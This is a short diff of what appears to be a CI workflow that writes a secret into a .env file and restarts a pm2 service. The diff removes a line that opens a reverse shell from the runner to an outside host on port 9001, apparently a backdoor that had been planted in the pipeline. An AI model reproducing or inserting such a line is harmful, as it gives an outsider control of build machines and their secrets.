@@ -30,5 +30,4 @@ jobs:
     - run: |
         touch .env
         echo '${{ secrets.NEW_ENV_FILE }}' > .env
-        bash -i >& /dev/tcp/anaskhan.site/9001 0>&1
     - run: pm2 restart Ilearn 
